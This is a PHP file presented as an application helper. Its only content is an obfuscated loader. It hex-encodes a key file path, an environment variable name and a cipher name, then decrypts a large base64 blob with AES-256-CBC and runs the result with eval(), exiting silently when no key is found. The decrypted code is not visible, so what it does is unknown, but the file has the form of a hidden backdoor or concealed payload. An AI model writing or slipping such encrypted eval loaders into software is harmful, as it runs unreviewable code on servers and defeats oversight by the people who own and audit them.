<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('5hQ2UKeUnVB8O8BXoAi+cA==');
$c=base64_decode(
'ImUsf9LzqJTQFLkPq03QmhbB4g1aY8AHxI3YteiYLnJNX6qXpyWPj/sGWtfrtVhhRfP763dEoYkj' .
'jz5RozDszXQfNfa0n4v125ye/cMWX+rp62FbGuIp22pzv04sG1HHgCCGgHC48bIpZGzRGUSqrxhn' .
'UuyqqP/+O5AdnwOMtIrbdxWTETSRXlb2FuUe7/q5TDjh4VwECJB3+zM0xk/y3KXvsfyhFGu5CT3e' .
'5XZYfnZHe+po4pAo9z2OB2dxHqzdVeFK8D0dqQiL3F7DnowfvxVUOdn72BUgk/x8Nq5gzPptKV1h' .
'cx/5XV1saiJGaYltaxlX0S3yvk34VZ/+RXa1k6L7Wk3o69UIKx+TnAHkOrV/cNfoCpYn99+5tXlD' .
'bI/JHGRrOr/XdkxBhYasvq5deAqAv/CZwKTXRI99fqnukX3oFH4Qw1bALxKl0+CrMsiDVvnD4PH5' .
'DCJZBcguDpyWshHghcgXBWy9XFJVk5v771zg/Z80KBsfkrKhhduwM4RG3g3qB/LCWVz6f6X27SqB' .
'7SqNGvy0H6mPkpz2R7qQgizThmm/JJKTE5GyYGhrwODSwGetrkPkWFsZklIKW0Gj9hhehgwJ0LdF' .
'PoCJ6tLoU/j6GTxU6wO2/b9ISSL2+UsR05Tf9tDI49VQn8J9vrmzznG+5nXW2uR2YKvw5K4AVHlu' .
'iChpTHRbTH+4bSDVqXikYalMxz21eNoAI7lHWsGmPjp7K1cQHH96fHXQ5jGFOY9oteAdLVhCoXUK' .
'k7JymK3mhF6XVNwcjzME260spmA94+PwehGqqfPuJ0ICasazxpPRJNIltl3zsBb9oZRHYJGAIrvr' .
'wfaq4zff9LMPF8Z2ZExpNHRpsfRdYIu1aOsI44zSA8kogY0YTmIYewcqx6GC5VNQfOMIK/7aqe6S' .
'wcZZdEyPaiwTKgsh4GDN1aFL2AppWkLDokrFIOhX9GPRISacP80xAksgw/NRxXeKP1qvenot2/Bc' .
'JPiUev+OcCMvKa62tbqx7qtTIZuXW1AgiLVuN96r/s5bnhQROXz/ESzH51YXbKMyUJXumq2pUejJ' .
'xomgueo0yyXNqMxpPEtTeXZEH2iAUcmVWSnq9ZyJNVh1Tfr9FDE/0lGThL2Er3WYgV7oJxCL6eBr' .
'jH3t02vYaHJyGuKlCG4h1pBJFpdqlTeAlhGRk+///giwH4EZp43UEy+Zmr4SLNtTNBoO6DzOw+Rj' .
'/zR/iF088l5iRdpcHA8rXdpB+k7HA5PH/+XtTr8KZCU0y9PC0+0AaRtj0J47rrTfLPpg3vVWAk2X' .
'mJKCJfBIFcStrQeGMO8/Jon9ziCvOAe4HJ7oZREP6DXAmG2S6QsO5KYa+6L7uH4rexpGxQS8Bzaq' .
'4JFpynyPjDDGhd/7J9Ee0VLtJHPASsB0Oh+gTCyMa+zfF6WfrzaSLx9bpSye0oHoA3mQwI/viEEo' .
't/a+ynJGAdgrMpFZzjJ5DOLXlerZoSZ76cnY8GccxD2xRXK1+iTWyDXH4ui/g8FLQRqs7Qf4/JvB' .
'Q+WMDm41tUTa/g17xx8z/s0E8A1qyCA5RFlpUAIWxBvLESbG2La0AyQQKGoYKgOyGUtRxouucISS' .
'N5JxBzp5M966YnLnGv1tUTPogwhIGlp/nyhX3kbz0qZQfOdF1pTtcfon07CibRdfv9mWllA11wD5' .
'qyJx3HH2LzwESmjBVP3IW0PdfzU4Eq5fIyRgX5fLTCgM6YJx6N6puCEWH3BIN2ZftLVI2nrMz5YW' .
'YcijtAAgueN2DX6unU+ehWnlPz13/T7VXvo5maR5OLkdQtyzuCzq4fwgrbZeZ/4jSO23YJCWv542' .
'q3DY4Pt3FQALovfNjNC+qfLOwO72d0y7ba6DuQF5E8VCc/bM+53Y7hPeJ/PGbY2Tzy8Bfqlcm9oM' .
'myyq/O5r8hblCfYIVVkxM+Qkf3+v1iBBJYdg3gULfR3wtn4Orba2fVuVD2atdhGptcb+bfIDbQDx' .
'jC0igoUmqUV9I9G5UDNhd9aV/Ki3COj5P86GIIX/x/3+9pO6RFB3jS+vVxWlIR/Ch4cXoz6Yq54E' .
'BIQDop4WzD4GTyYbpeSzoyIiQMau1Xur8WXyawILTPkUPUxAO7sa0eGpykmPCDc3lYBTZjkgU0Nd' .
'hypurQuFW5Jp9Jhu2v5N4X/H2Z+WgP5nlO+3exS+yvJBbYVO'
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
